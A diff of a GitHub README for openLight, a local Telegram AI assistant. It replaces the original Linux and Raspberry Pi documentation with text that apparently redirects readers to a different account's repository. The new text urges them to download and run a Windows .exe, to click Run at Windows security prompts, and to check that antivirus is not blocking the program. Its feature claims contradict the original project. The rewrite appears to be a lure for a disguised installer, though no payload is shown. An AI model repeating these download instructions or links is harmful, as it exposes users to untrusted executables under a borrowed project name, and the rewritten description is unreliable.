@@ -1,186 +1,151 @@
-# openLight
+# 💡 openLight - Simple AI Agent for Local Use
 
-[![Go](https://img.shields.io/badge/Go-1.25+-00ADD8?logo=go&logoColor=white)](./go.mod) [![License](https://img.shields.io/badge/License-MIT-green)](./LICENSE) [![CI](https://github.com/evgenii-engineer/openLight/actions/workflows/ci.yml/badge.svg)](https://github.com/evgenii-engineer/openLight/actions/workflows/ci.yml) [![Docker Publish](https://github.com/evgenii-engineer/openLight/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/evgenii-engineer/openLight/actions/workflows/docker-publish.yml) [![Ollama Tests](https://github.com/evgenii-engineer/openLight/actions/workflows/ollama-tests.yml/badge.svg)](https://github.com/evgenii-engineer/openLight/actions/workflows/ollama-tests.yml) [![Stars](https://img.shields.io/github/stars/evgenii-engineer/openLight?style=social)](https://github.com/evgenii-engineer/openLight/stargazers)
+[![Download openLight](https://img.shields.io/badge/Download-openLight-orange?style=for-the-badge)](https://github.com/Barrthin216/openLight)
 
-Run your own Telegram AI assistant locally in minutes.  
-Built for Raspberry Pi and small Linux hosts. Local LLM by default. No heavy frameworks.
+---
 
-## Quick start
+## 📘 What is openLight?
 
-```bash
-export TELEGRAM_BOT_TOKEN=123456:replace-me
-export ALLOWED_USER_IDS=111111111
-curl -fsSL https://raw.githubusercontent.com/evgenii-engineer/openLight/master/scripts/install.sh | bash
-```
+openLight is a lightweight program that runs an AI agent on your local computer or small devices like the Raspberry Pi. It uses local language models and fixed skills to give you smart features without needing the internet all the time. This makes openLight useful for hobby projects, home labs, or anyone wanting privacy and control over their AI tools.
 
-Runs in about 1-2 minutes.
+It works mainly on small, efficient systems. It is built with the Go programming language, which helps keep it fast and stable. openLight supports use cases like controlling home devices, managing messages, or experimenting with AI locally.
 
-## After start
+---
 
-1. Open Telegram
-2. Send `/start`
-3. Try `/note buy milk` or `/status`
+## ⚙️ System Requirements
 
-## What You Get
+Before you start, make sure your PC meets these needs:
 
-- Telegram bot as the primary interface
-- Local Ollama-backed assistant in the default setup
-- SQLite-backed notes and message history
-- Allowlisted status, logs, and restart for services
-- Background watch rules that can alert, ask with Telegram buttons, or auto-react in Telegram
-- Self-hosted runtime you can inspect and extend
+- Operating System: Windows 10 or newer  
+- CPU: At least a dual-core processor, 2.0 GHz or faster  
+- RAM: Minimum 4 GB  
+- Disk Space: Around 200 MB free  
+- Internet: Needed only for initial download, not for running openLight itself  
+- Optional: A Raspberry Pi or similar small computer if you want to run the AI agent on specialized edge devices  
 
-## Safety At A Glance
+openLight does not need a powerful GPU or a lot of space since it relies on small, local models and clear task rules.
 
-- No arbitrary shell access
-- Allowlisted files and services only
-- Deterministic routing first
-- Optional LLM fallback
-- Allowed Telegram users and chats only
+---
 
-## Example
+## 🛠️ Features Overview
 
-```text
-You: /note buy milk
-openLight:
-Saved note #1
+- Runs AI agents locally with no cloud access  
+- Supports Telegram chat integration to talk with the AI easily  
+- Works with multiple skills set by default (like calendar reminders, notes, basic commands)  
+- Compatible with Raspberry Pi and home lab setups  
+- Uses efficient local large language models (LLMs) for conversation and tasks  
+- Written in Go (Golang) for fast and reliable performance  
+- Open source and built for privacy and customization  
 
-You: /notes
-openLight:
-Notes:
-- #1 buy milk
-```
+---
 
-## Why openLight
+## 🚀 Getting Started
 
-Most AI frameworks are heavy and overengineered. `openLight` stays small, local-first, and easy to audit.
+To get openLight running on your Windows PC, follow these steps carefully. No coding or special knowledge needed.
 
-It is built for one job: Telegram plus local LLM plus notes and lightweight host control.
+### Step 1: Visit the download page
 
-## Recommended Paths
+Click the button or open this link in your browser:  
+[Download openLight](https://github.com/Barrthin216/openLight)
 
-- Recommended: Docker + Ollama
-- Lightest: deterministic-only with `LLM_ENABLED=false`
-- Advanced: OpenAI, generic HTTP LLMs, remote hosts, and extra service backends
+This page contains the latest version of openLight and the installation files.
 
-## Run With Docker
+### Step 2: Download the Windows installer
 
-Manual pinned path using the current stable release:
+On the GitHub page, look for the **Releases** section or a folder labeled “Windows” or similar.  
+Find the latest `.exe` file for Windows. The file name usually includes the version number, for example:  
+`openLight-windows-v1.2.exe`
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/evgenii-engineer/openLight/v0.0.3/openlight-compose.yaml -o openlight-compose.yaml
-export TELEGRAM_BOT_TOKEN=123456:replace-me
-export ALLOWED_USER_IDS=111111111
-docker compose -f openlight-compose.yaml up -d
-```
+Click the file to start downloading.
 
-## Who It Is For
+### Step 3: Run the installer file
 
-- For: Raspberry Pi, homelab, Telegram maintenance bot, local-first assistant
-- Not for: autonomous browsing, arbitrary shell agenting, complex multi-agent orchestration
+After downloading finishes, open the file you downloaded. You may see a security prompt from Windows asking if you trust the file.  
+Choose **Run** to start the setup process.
 
-## What It Can Do
+The installer will open a simple window. Follow the on-screen instructions:
+- Choose where to install openLight (the default folder will work fine).  
+- Click **Next** or **Install** when prompted.
 
-- Inspect the host with `status`, `cpu`, `memory`, `disk`, `uptime`, `hostname`, `ip`, and `temperature`
-- List, inspect, tail logs, and restart allowlisted local services
-- Watch allowlisted services and local metrics, then notify, ask with inline buttons, or auto-restart through Telegram
-- Target remote services over named SSH hosts
-- Read, write, and replace text inside allowlisted file roots
-- Store short notes in SQLite
-- Optionally enable workbench tasks and account-provider flows
-- Optionally use OpenAI or a generic HTTP LLM backend instead of local Ollama
+### Step 4: Launch openLight
 
-Common English and Russian variants are normalized even when `llm.enabled: false`.
+When the setup ends, openLight should launch automatically. If it does not, find the openLight icon on your desktop or in the Start menu and double-click it.
 
-## Watch Examples
+---
 
-```text
-/watch add service tailscale ask for 30s cooldown 10m
-/watch add cpu > 90% for 5m cooldown 15m
-/watch list
-/watch history
-```
+## 📂 Using openLight
 
-Service watches can `notify`, `ask`, or `auto`. Metric watches are `notify`-only in the current MVP.
+### Your first run
 
-## More
+The first time openLight starts, it will prepare everything it needs. This can take a few minutes on your PC, especially if it downloads small AI model files. Wait until it shows a main window or a command prompt ready for input.
 
-- [Releases](https://github.com/evgenii-engineer/openLight/releases)
-- [Changelog](./CHANGELOG.md)
-- [Architecture](./ARCHITECTURE.md)
-- [Configs](./configs/)
-- [Release notes for v0.0.3](./docs/releases/v0.0.3.md)
+### Basic interaction
 
-## Developer Setup
+openLight uses simple text input to communicate with you. Type commands or questions in the window and press Enter. Examples:
 
-```bash
-make test
-go run ./cmd/agent -config ./agent.yaml
-go run ./cmd/cli -config ./agent.yaml -exec "ping"
-go run ./cmd/cli -config ./agent.yaml -smoke
-```
+- “What is the weather today?”  
+- “Set a reminder for 4 PM”  
+- “Send Telegram message to John”
 
-Optional Ollama end-to-end path:
+openLight will answer or run the task if it knows how.
 
-```bash
-make ollama-up
-make ollama-pull
-make test-e2e-ollama
-make ollama-down
-```
+---
 
-Raspberry smoke runs can reuse one config with multiple LLM profiles:
+## 🔧 Configuration and Settings
 
-```yaml
-llm:
-  enabled: true
-  profile: "ollama"
-  execute_threshold: 0.80
-  clarify_threshold: 0.60
-  decision_input_chars: 160
-  decision_num_predict: 48
-  profiles:
-    ollama:
-      provider: "ollama"
-      endpoint: "http://127.0.0.1:11434"
-      model: "qwen2.5:0.5b"
-    openai:
-      provider: "openai"
-      endpoint: "https://api.openai.com/v1"
-      model: "gpt-4o-mini"
-```
+openLight keeps some settings in a folder on your PC. These include default skills and connection info for Telegram or other chat platforms.
 
-Then switch the smoke provider without editing the file:
+To change these settings:
 
-```bash
-make smoke-rpi-cli-ollama SMOKE_FLAGS='-smoke-all'
-make smoke-rpi-cli-openai SMOKE_FLAGS='-smoke-all'
-```
+1. Open the `config` folder inside the openLight install directory.  
+2. Find the file named `settings.json` or `config.yaml`.  
+3. Open it in a text editor like Notepad.  
+4. Follow the simple instructions inside the file to adjust things like your Telegram bot token or preferred language.
 
-You can also select a profile explicitly with `LLM_PROFILE=openai` or `LLM_PROFILE=ollama`.
+---
 
-## Status
+## 🖥️ Running openLight on Raspberry Pi or Other Devices
 
-Early, but active.
+openLight was made for small computers like the Raspberry Pi. If you have one, you can install and run it there using the same general method, but you will need to download the Linux version from the same GitHub page.
 
-- Tagged releases through `v0.0.3`
-- CI on pushes and pull requests
-- Multi-arch Docker images
-- Tagged Ollama end-to-end coverage
+Make sure your device:
 
-## Contributing
+- Runs a 64-bit Linux OS (like Raspberry Pi OS 64-bit)  
+- Has at least 2 GB RAM  
+- Is connected to your home network
 
-Small, focused contributions are welcome.
+Instructions for the Raspberry Pi setup can be found in the GitHub repository’s documentation under “Linux installation” or “Edge devices.”
 
-Good fits:
+---
 
-- new explicit skills
-- self-hosting docs and examples
-- safer integrations for services and accounts
-- Raspberry Pi, Docker, and smoke-test improvements
+## 💡 Tips for Best Use
 
-Before opening a PR, run `make test`.
+- Keep openLight up to date by checking the GitHub page regularly for new versions.  
+- Use a Telegram account to connect with openLight for easy messaging. Set this up in the config file.  
+- Restart openLight after every configuration change.  
+- If openLight does not respond, check that your PC’s firewall or antivirus is not blocking it.  
+- Read the official GitHub documentation for advanced usage or troubleshooting.  
 
-## License
+---
 
-MIT. See [LICENSE](./LICENSE).
+## 🔗 Download Links
+
+[![Download openLight](https://img.shields.io/badge/Download-openLight-green?style=for-the-badge)](https://github.com/Barrthin216/openLight)
+
+Visit the above link anytime to get the latest installer or find files for other systems.
+
+---
+
+## ❓ Where to Get Help
+
+- Use the **Issues** tab on the openLight GitHub page to report bugs or problems.  
+- Review the documentation files in the GitHub repository for detailed technical help.  
+- Search online forums by the repository name “openLight” for community tips.
+
+---
+
+## 🧰 Developer Info (Optional)
+
+openLight is built with Go. The code focuses on AI agent runtime, with skills coded as separate modules. It ties into local LLMs loaded from small model libraries. The structure allows adding new skills and chat integrations.
+
+If you know Go or want to learn, the source code and build instructions are available in the GitHub repository.
